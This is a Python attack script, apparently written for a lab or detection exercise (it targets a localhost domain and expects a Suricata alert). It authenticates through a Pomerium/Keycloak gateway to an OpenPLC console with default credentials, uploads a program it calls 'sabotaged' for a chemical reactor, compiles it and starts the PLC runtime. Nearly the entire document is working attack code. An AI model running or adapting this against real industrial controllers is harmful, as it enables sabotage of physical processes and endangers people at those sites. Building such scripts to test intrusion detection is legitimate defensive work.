#!/usr/bin/env python3
import sys
import requests
import re
import urllib3
import time as _time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PLC_URL      = 'https://plc.localhost.pomerium.io'
KC_USER      = 'admin'
KC_PASS      = 'admin'
PLC_USER     = 'openplc'
PLC_PASS     = 'openplc'
ST_FILE      = '/home/engineer/Desktop/chemical.st'

def main(st_file=None):
    if st_file:
        global ST_FILE
        ST_FILE = st_file

    session = requests.Session()
    session.verify = False
    session.max_redirects = 10

    print('  [i] Initiating OAuth2 flow through Pomerium gateway...')
    try:
        resp = session.get(f'{PLC_URL}/login', allow_redirects=True, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f'  [-] Failed to reach Pomerium: {e}')
        sys.exit(1)

    if 'kc-login' not in resp.text and 'username' not in resp.text:
        print(f'  [-] Unexpected page. Not a Keycloak login form.')
        sys.exit(1)

    action_match = re.search(r'action="([^"]+)"', resp.text)
    if not action_match:
        print('  [-] Could not find Keycloak login form action URL.')
        sys.exit(1)

    kc_action_url = action_match.group(1).replace('&amp;', '&')
    print('  [i] Submitting Keycloak credentials...')

    login_data = {'username': KC_USER, 'password': KC_PASS}
    try:
        resp = session.post(kc_action_url, data=login_data, allow_redirects=True, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f'  [-] Keycloak auth failed: {e}')
        sys.exit(1)

    if resp.status_code == 200 and ('plc' in resp.url.lower() or 'openplc' in resp.text.lower()):
        print('  [+] Pomerium session established. Accessing PLC management console...')
        plc_login_data = {'username': PLC_USER, 'password': PLC_PASS}
        try:
            resp = session.post(f'{PLC_URL}/login', data=plc_login_data, allow_redirects=True, timeout=15)
            if resp.status_code == 200 and 'dashboard' in resp.url.lower():
                print('  [+] PLC console login SUCCESSFUL — Suricata alert 1000101 should fire.')
                try:
                    with open(ST_FILE, 'rb') as f:
                        resp = session.post(f'{PLC_URL}/upload-program', files={'file': ('chemical.st', f)}, allow_redirects=True, timeout=15)
                    
                    if resp.status_code == 200:
                        fname_match = re.search(r"value='(\d+\.st)'", resp.text)
                        st_filename = fname_match.group(1) if fname_match else None
                        if st_filename:
                            epoch = str(int(_time.time()))
                            session.post(f'{PLC_URL}/upload-program-action',
                                                data={'prog_name': 'Chemical Reactor',
                                                      'prog_descr': '',
                                                      'prog_file': st_filename,
                                                      'epoch_time': epoch},
                                                allow_redirects=False, timeout=15)
                            print('  [+] Sabotaged program uploaded to PLC successfully.')
                            print('  [i] Triggering compilation...')
                            session.get(f'{PLC_URL}/compile-program?file={st_filename}', allow_redirects=True, timeout=30)
                            
                            # Poll dashboard until compilation finishes (up to 5 minutes)
                            print('  [i] Waiting for compilation to complete...')
                            for _ in range(60):
                                try:
                                    r = session.get(f'{PLC_URL}/dashboard', timeout=10)
                                    if 'Compiling' not in r.text:
                                        break
                                except Exception:
                                    pass
                                _time.sleep(5)

                            print('  [i] Starting PLC runtime...')
                            session.get(f'{PLC_URL}/start_plc', timeout=30)
                            print('  [+] PLC compilation triggered and runtime started.')
                except Exception as e:
                    print(f'  [!] Error during upload/start: {e}')
            else:
                print(f'  [!] PLC login returned HTTP {resp.status_code}.')
        except requests.exceptions.RequestException as e:
            print(f'  [-] PLC login request failed: {e}')
    else:
        print(f'  [!] Pomerium session incomplete (HTTP {resp.status_code})')
    print('  [+] PLC login attack step complete.')

if __name__ == '__main__':
    st_file = sys.argv[1] if len(sys.argv) > 1 else None
    main(st_file)
